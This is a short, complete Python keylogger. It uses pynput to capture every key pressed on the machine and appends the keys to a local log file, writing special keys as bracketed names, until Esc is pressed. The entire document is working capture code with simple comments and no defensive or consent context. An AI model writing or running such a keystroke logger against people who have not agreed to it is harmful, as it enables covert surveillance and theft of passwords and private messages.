import pynput
from pynput.keyboard import Key, Listener

# Specify the log file path
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as file:
            # If the key has a character representation, write it to the log file
            file.write(f'{key.char}')
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(log_file, "a") as file:
            if key == Key.space:
                file.write(' ')
            else:
                file.write(f'[{key.name}]')  # Write the special key name in square brackets

# Function to handle key release events
def on_release(key):
    # Stop the listener when the Esc key is pressed
    if key == Key.esc:
        return False

# Main block to start the key listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
